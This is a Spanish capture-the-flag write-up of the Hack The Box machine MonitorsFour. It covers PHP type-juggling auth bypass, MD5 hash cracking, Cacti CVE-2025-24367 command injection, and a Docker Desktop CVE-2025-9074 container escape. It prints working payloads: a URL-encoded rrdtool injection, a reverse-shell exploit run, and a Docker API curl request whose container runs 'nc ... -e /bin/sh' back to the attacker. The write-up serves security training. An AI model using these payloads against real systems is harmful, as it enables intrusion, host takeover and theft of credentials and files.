---
title: MonitorsFour - Easy (HTB)
permalink: /MonitorsFour-HTB-Writeup/
tags:
  - Windows
  - Easy
  - "Type Juggling"
  - CVE-2025-24367
  - Cacti
  - CVE-2025-9074
  - "Hash Cracking"
  - "Docker API"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: MonitorsFour - Easy (HTB)
seo_description: Explota Type Juggling en PHP, CVE-2025-24367 en Cacti y CVE-2025-9074 en Docker Desktop para vencer MonitorsFour.
excerpt: Explota Type Juggling en PHP, CVE-2025-24367 en Cacti y CVE-2025-9074 en Docker Desktop para vencer MonitorsFour.
header:
  overlay_image: /assets/images/headers/monitorsfour-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/monitorsfour-hackthebox.jpg
---
![image-center](/assets/images/posts/monitorsfour-hackthebox.png)
{: .align-center}

**Habilidades:** PHP Type Juggling Attack, Hash Cracking, CVE-2025-24367 - `Cacti` Authenticated Graph Template RCE, CVE-2025-9074 - Docker Desktop Container Escape [Privilege Escalation]
{: .notice--primary}

# Introducción

MonitorsFour es una máquina Windows de dificultad `Easy` en la que debemos comprometer el servicio Cacti, el cual es vulnerable a CVE-2025-24367 y permite acceso inicial a un contenedor de Docker.

La escalada de privilegios es posible mediante CVE-2025-9074, la cual es una vulnerabilidad que expone la API de Docker a los contenedores Linux en ejecución sin necesidad de autenticarse, permitiendo escapar del aislamiento de Docker y acceder los archivos del host generando un contenedor malicioso.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.98                         
PING 10.10.11.98 (10.10.11.98): 56 data bytes
64 bytes from 10.10.11.98: icmp_seq=0 ttl=127 time=314.791 ms

--- 10.10.11.98 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 314.791/314.791/314.791/0.000 ms
~~~


## Port Scanning 

Comenzaremos con un escaneo de puertos que se encargue de identificar servicios expuestos en la máquina víctima

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.98 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 16:06 -03
Nmap scan report for 10.10.11.98
Host is up (0.22s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que se encargue de intentar identificar los servicios, además de lanzar un conjunto de scripts de reconocimiento

~~~ bash
nmap -p 80,5985 -sVC 10.10.11.98 -oN services 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 16:07 -03
Nmap scan report for 10.10.11.98
Host is up (0.36s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.06 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Solamente logramos ver dos servicios, `http` y el puerto que Windows usa para el servicio `winrm`. Vemos que el servidor web nos intenta redireccionar a `monitorsfour.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts`

``` bash
echo '10.10.11.98 monitorsfour.htb' | sudo tee -a /etc/hosts

10.10.11.98 monitorsfour.htb
```


## Web Enumeration

Podemos lanzar un escaneo de las tecnologías web que el servidor pueda estar utilizando para mostrar el contenido

``` bash
whatweb http://monitorsfour.htb

http://monitorsfour.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[sales@monitorsfour.htb], HTTPServer[nginx], IP[10.10.11.98], JQuery, PHP[8.3.27], Script, Title[MonitorsFour - Networking Solutions], X-Powered-By[PHP/8.3.27], X-UA-Compatible[IE=edge], nginx
```

Navegaremos hasta `monitorsfour.htb` para ver la siguiente página web

![image-center](/assets/images/posts/monitorsfour-1-hackthebox.png)
{: .align-center}

El botón `Login` sorprendentemente nos lleva hacia un formulario para iniciar sesión en la plataforma

![image-center](/assets/images/posts/monitorsfour-2-hackthebox.png)
{: .align-center}

### Fuzzing

Intentaremos descubrir rutas existentes en este servidor web, las cuales no vemos en primera instancia 

``` bash
gobuster dir -u http://monitorsfour.htb/ -w /usr/local/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt             
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/local/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 367]
/login                (Status: 200) [Size: 4340]
/user                 (Status: 200) [Size: 35]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
```

Vemos algunas rutas como `/user` y `/static`, estas no estaban disponibles a simple vista. Al navegar hasta el endpoint `/user` veremos que se necesita tramitar un token para el acceso

![image-center](/assets/images/posts/monitorsfour-3-hackthebox.png)
{: .align-center}

### Subdomain Fuzzing

Intentaremos descubrir subdominios existentes a través de un escaneo con herramientas como `gobuster`, `wfuzz`, `ffuf`, etc.

``` bash
gobuster vhost -u http://monitorsfour.htb/ -w /usr/local/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://monitorsfour.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/local/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
```

Descubrimos un subdominio `cacti`, lo agregaremos a nuestro archivo `/etc/hosts` para que las resoluciones DNS funcionen correctamente

``` bash
sudo sed -i 's/monitorsfour\.htb/& cacti.monitorsfour.htb/g' /etc/hosts
```

Al navegar hasta `cacti.monitorsfour.htb`, veremos el panel de inicio de sesión de la plataforma Cacti.

> `Cacti` es una popular herramienta de código abierto basada en la web para la monitorización de redes y el rendimiento de sistemas.
{: .notice--info}

![image-center](/assets/images/posts/monitorsfour-4-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## PHP Type Juggling Attack

Un ataque de manipulación de tipos PHP o ataque `Type Juggling` es una vulnerabilidad que explota una característica de PHP para obtener acceso no autorizado o comportamientos inesperados en el servidor. 

### Understanding Vulnerability

PHP es un lenguaje de tipado flexible (`Loose`), lo que significa que el lenguaje intenta predecir la intención del programador. Por ejemplo, una cadena que solo contiene números (`"123"`) puede tratarse como un entero (`int`) o flotante (`float`).

El problema viene cuando PHP intenta comparar dos variables de tipos distintos usando operadores como `==` o `!=`, estos realizan una comparación débil ([`Loose Comparison`](https://swisskyrepo.github.io/PayloadsAllTheThings/Type%20Juggling/)), contemplando solo la igualdad de valores, sin comparar la igualdad de tipos de dato (como lo hace la comparación estricta con `===` o `!==`).

| Statement                   | Output                           |
| --------------------------- | -------------------------------- |
| `'0010e2' == '1e3'`         | true                             |
| `'0xABCdef' == ' 0xABCdef'` | true (PHP 5.0) / false (PHP 7.0) |
| `'0xABCdef' == ' 0xABCdef'` | true (PHP 5.0) / false (PHP 7.0) |
| `'0x01' == 1`               | true (PHP 5.0) / false (PHP 7.0) |
| `'0x1234Ab' == '1193131'`   | true (PHP 5.0) / false (PHP 7.0) |
| `'123' == 123`              | true                             |
| `'123a' == 123`             | true                             |
| `'abc' == 0`                | true                             |
| `'' == 0 == false == NULL`  | true                             |
| `'' == 0`                   | true                             |
| `0 == false`                | true                             |
| `false == NULL`             | true                             |
| `NULL == ''`                | true                             |

Las comparaciones débiles pueden ocasionar comportamientos inesperados por el servidor, retornando una respuesta verdadera o falsa. Esto puede permitir a un atacante provocar errores de autorización y/o autenticación o acceder a recursos no autorizados. 

Luego de unas pruebas manuales con el parámetro `token`, obtendremos los registros de los usuarios existentes en la plataforma

![image-center](/assets/images/posts/monitorsfour-5-hackthebox.png)
{: .align-center}

También podemos obtener este resultado desde una solicitud HTTP con `curl`

``` bash
curl -X GET http://monitorsfour.htb/user\?token\=0

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

> **¿Por qué en este contexto se trata de `Type Juggling` y no de la vulnerabilidad IDOR?**.
> 
> Este caso no puede ser catalogado como IDOR (`Insecure Direct Object Reference`) debido a las siguientes consideraciones:
> 
> - No estamos accediendo a valores que no nos corresponden.
> - Estamos rompiendo la lógica de validación.
> - El valor usado en el parámetro `token=0` no es legítimo, es un payload para obligar al servidor a retornar `true`.
{: .notice--danger}

Los registros presentan un campo `token`, donde cada uno puede ser utilizado para acceder a ellos, como se muestra en el siguiente ejemplo:

![image-center](/assets/images/posts/monitorsfour-6-hackthebox.png)
{: .align-center}

## Hash Cracking

Extraeremos el campo `password` y `username` para intentar descifrar estos hashes empleando un diccionario

``` bash
curl -sX GET http://monitorsfour.htb/user\?token\=0 | jq -r '.[] | "\(.username):\(.password)"' | tee hashes.txt
  
admin:56b32eb43e6f15395f6c46c1c9e1cd36
mwatson:69196959c16b26ef00b77d82cf6eb169
janderson:2a22dcf99190c322d974c8df5ba3256b
dthompson:8d4a7e7fd08555133e056d9aacb1e519
```

Lanzaremos herramientas como `john`, `hashcat` usando el diccionario `rockyou.txt` o herramientas online como [`crackstation.net`](https://crackstation.net/)

~~~ bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt --format=Raw-MD5 hashes.txt

Created directory: /Users/andrees/.john
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
wonderful1       (admin)
1g 0:00:00:01 DONE (2025-12-18 13:56) 0.7462g/s 10703Kp/s 10703Kc/s 32124KC/s !..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
~~~


## Web Access as `admin`

Descubrimos la contraseña para el usuario `admin`, con estas credenciales podremos iniciar sesión en la plataforma principal

![image-center](/assets/images/posts/monitorsfour-7-hackthebox.png)
{: .align-center}


## Password Reuse

Con estas credenciales podemos intentar iniciar sesión dentro del servicio `cacti`

![image-center](/assets/images/posts/monitorsfour-8-hackthebox.png)
{: .align-center}

Aunque en vez de `admin` usaremos el primer nombre del usuario, el cual es `marcus`, este cambio podemos verlo al consultar el registro que vimos cuando explotamos la web principal

``` json
{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},
```

![image-center](/assets/images/posts/monitorsfour-9-hackthebox.png)
{: .align-center}


## CVE-2025-24367 - `Cacti` Authenticated Graph Template RCE

La versión de `Cacti` es vulnerable a [CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367), la cual es una vulnerabilidad que afecta a versiones anteriores a la `1.2.29`. Esta permite a un usuario autenticado crear gráficos y plantillas de gráficos para crear scripts PHP y ejecutar comandos en el servidor

### Understanding Vulnerability

Cacti usa el binario `rrdtool` para generar gráficos e imágenes basados en bases de datos `Round Robin` (RRD). Es posible configurar diversos modificadores para el binario a través de la interfaz web, esencialmente dentro de la plantilla de gráfico o las capacidades de generación de gráficos. 

Cacti intenta limpiar las entradas del usuario potencialmente contaminadas escapando los metacaracteres de shell. Por ejemplo, en la función `rrd_function_process_graph_options()` en `lib/rrd.php`

``` php
case 'right_axis_label':
	if (!empty($value)) {
		$graph_opts .= '--right-axis-label ' . cacti_escapeshellarg($value) . RRD_NL;
	}
```

La función que sanitiza caracteres se encuentra en `lib/functions.php`

``` php
/**
 * mimics escapeshellarg, even for windows
 *
 * @param  $string 	- the string to be escaped
 * @param  $quote 	- true: do NOT remove quotes from result; false: do remove quotes
 *
 * @return	string	- the escaped [quoted|unquoted] string
 */
function cacti_escapeshellarg(string $string, bool $quote = true): string {
	global $config;

	if ($string == '') {
		return $string;
	}

	/* we must use an apostrophe to escape community names under Unix in case the user uses
	characters that the shell might interpret. the ucd-snmp binaries on Windows flip out when
	you do this, but are perfectly happy with a quotation mark. */
	if ($config['cacti_server_os'] == 'unix') {
		$string = escapeshellarg($string);

		if ($quote) {
			return $string;
		} else {
			# remove first and last char
			return substr($string, 1, (strlen($string) - 2));
		}
	}
```

Sin embargo, los caracteres de nueva línea no se escapan ni se eliminan mediante la lógica de sanitización y pueden inyectarse para salir del comando y generar comandos separados en el binario `rrdtool`

``` php
XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph xxx2.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?>
```

Al inyectar múltiples caracteres de nueva línea, es posible llamar a esta función de forma separada en un solo payload, creando dos comandos independientes:

- El primer comando crea una nueva base de datos RRD que se utiliza en el segundo comando.
- El segundo comando crea un "gráfico" `CSV` de los datos del archivo RRD (`my.rrd`) recién creado y guarda el archivo como `xxx2.php`, el cual contiene código PHP incrustado en él.

Entonces en este caso el parámetro `--right-axis-label` viajaría hacia el servidor con el payload anterior codificado en `URL Encode`

``` php
XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+xxx2.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3Dphpinfo%28%29%3B%3F%3E%0A
```

- `%0A` es la representación en URL de un salto de línea (`\n`).

De esta forma, el resultado será un nuevo archivo PHP que podemos llamar desde la ruta raíz de la web

``` php
$ cat /var/www/html/cacti/xxx2.php 
"time","<?=phpinfo();?>"
1735914000,"NaN" 
```

### Exploiting

Podemos encontrar una prueba de concepto en [Github](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC) subida por uno de los creadores de la máquina, la cual modifica ligeramente la lógica de la webshell para ejecutar directamente un comando en el servidor, como se puede ver en la línea [`142`](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py#L142) de la PoC.

Iniciaremos un listener que se encargue de recibir la shell que enviaremos desde el servicio `cacti`

``` bash
nc -lvnp 443
```

Ejecutaremos el exploit para lanzar una conexión hacia nuestra IP y puerto usando una webshell

``` bash
sudo python3 exploit.py -u marcus -p wonderful1 -i 10.10.16.203 -l 443 -url http://cacti.monitorsfour.htb 

[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: vgG1u.php
[+] Got payload: /bash
[i] Created PHP filename: 6EPDD.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Este script realiza dos pasos importantes para la explotación, donde el primero es guardar un archivo de [reverse shell](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py#L98) llamado `bash`

![image-center](/assets/images/posts/monitorsfour-10-hackthebox.png)
{: .align-center}

Para luego enviar una solicitud enviando un comando que ejecuta esta reverse shell con `bash`

![image-center](/assets/images/posts/monitorsfour-11-hackthebox.png)
{: .align-center}

- `\x20` representa el valor hexadecimal del caracter de espacio (` `).


## Shell as `www-data` - `Cacti` Container

En nuestro listener recibiremos una consola como el usuario `www-data`

``` bash
nc -lvnp 443
Connection from 10.129.45.181:55101
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ 
```

### TTY Treatment

Podemos mejorar esta shell lanzando una pseudo-consola además de ajustar tanto las proporciones de la terminal como su tipo

``` bash
www-data@821fbd6a43fa:~/html/cacti$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@821fbd6a43fa:~/html/cacti$ ^Z # Press Ctrl + Z
[1]  + 17817 suspended  nc -lvnp 443
andrees@HackBookPro content $ stty raw -echo;fg                                                                                       
[1]  + 17817 continued  nc -lvnp 443
                                    reset xterm
                                    
www-data@821fbd6a43fa:~/html/cacti$
www-data@821fbd6a43fa:~/html/cacti$ stty rows 42 columns 142
www-data@821fbd6a43fa:~/html/cacti$ export TERM=xterm
```

Ya podremos ver la flag del usuario no privilegiado en el directorio `/home/marcus`

``` bash
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
b19...
```
<br>
# Escalada de Privilegios
---
## System Enumeration

En este punto nos encontramos dentro de un contenedor de docker, debido a tanto la IP como el nombre de host

``` bash
www-data@821fbd6a43fa:~/html/cacti$ hostname -I
172.18.0.3 
```

En este punto intentaremos realizar una enumeración del sistema en búsqueda de vectores potenciales para escalar privilegios

### Users

Al consultar el archivo `passwd`, notaremos que existe solamente el usuario `marcus` y `root`

``` bash
www-data@821fbd6a43fa:~/html/cacti$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000::/home/marcus:/bin/bash
```

### Internal Network

Al inspeccionar el archivo `resolv.conf`, notaremos que este ha sido generado por `Docker Engine`, y expone una IP que corresponde al servidor DNS en esta red

~~~ bash
www-data@821fbd6a43fa:~/html/cacti$ cat /etc/resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal
~~~


## CVE-2025-9074 - Docker Desktop Container Escape

[CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074) es una vulnerabilidad en Docker Desktop que permite a un contenedor  Linux local en ejecución realizar un escape de aislamiento, a través de acceso a la API de `Docker Engine` sin necesidad de autenticación. Las versiones afectadas son entre la `4.25` hasta `4.44.3`

### Understanding Vulnerability

Por defecto  la API de `Docker Engine` a los contenedores que se ejecutan localmente a través de la subred `192.168.65.7:2375`. El fallo ocurre cuando se expone esta API sin la necesidad de montar el socket `docker` (`docker.sock`).

El acceso a los archivos del host puede lograrse mediante crear un contenedor malicioso que monte la unidad del host (como `C:\`), este contenedor puede ser creado y ejecutado realizando solicitudes POST a los endpoints `/create` y `/start` de la API

### Exploiting

La siguiente solicitud POST crea un contenedor montando la unidad `C:\` del host (o sea, la máquina Windows), en este caso estamos enviando una shell hacia nuestra IP desde el nuevo contenedor. 

Esto retorna un identificador, el cual es necesario para lanzarlo en la siguiente solicitud

``` bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/create -H 'Content-Type: application/json' -d '{ "Image": "alpine", "Cmd": ["sh", "-c", "nc 10.10.16.13 443 -e /bin/sh"], "HostConfig": { "Binds": ["/mnt/host/c:/host_root"] }}'

{"Id":"44713477b3dfa172763cc727cb24d6b70381d895eeeab642f8a21b5852a0cc9e","Warnings":[]}
```

Pondremos un puerto a la escucha que se encargue de recibir la shell que enviará el nuevo contenedor

``` bash
nc -lvnp 443
```


## Root Time

Para lanzar el contenedor, enviaremos una solicitud POST de la siguiente manera, indicando el `id` del contenedor que obtuvimos de la salida del comando anterior

``` bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/44713477b3dfa172763cc727cb24d6b70381d895eeeab642f8a21b5852a0cc9e/start
```

En nuestro listener recibiremos la conexión desde el nuevo contenedor malicioso como `root`

``` bash
nc -lvnp 443
Connection from 10.129.47.70:57203
whoami
root
```

Tendremos una montura disponible dentro de `host_root`

``` bash
ls /

bin
dev
etc
home
host_root
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Como montamos la unidad `C:\` dentro de este nuevo contenedor, deberíamos disponer de los archivos de la máquina Windows a través de `/host_root`

``` bash
ls host_root
$RECYCLE.BIN
$WinREAgent
Documents and Settings
PerfLogs
Program Files
Program Files (x86)
ProgramData
Recovery
System Volume Information
Users
Windows
Windows.old
inetpub
```

Si intentamos acceder al directorio del usuario `Administrator`, tendremos acceso completo

``` bash
ls -la host_root/Users/Administrator/Desktop 
total 0
drwxrwxrwx    1 root     root          4096 Nov 10 17:54 .
drwxrwxrwx    1 root     root          4096 Nov  3 12:05 ..
-rwxrwxrwx    1 root     root           282 Mar 24  2025 desktop.ini
-r-xr-xr-x    1 root     root            34 Dec  7 09:55 root.txt
```

Ya podremos ver la flag ubicada en el escritorio del usuario `Administrator`

``` bash
cat host_root/Users/Administrator/Desktop/root.txt 
7e0...
```
<br>
Gracias por leer, a continuación te dejo la cita del día.

> We choose our destiny in the way we treat others.
> — Wit
{: .notice--info}
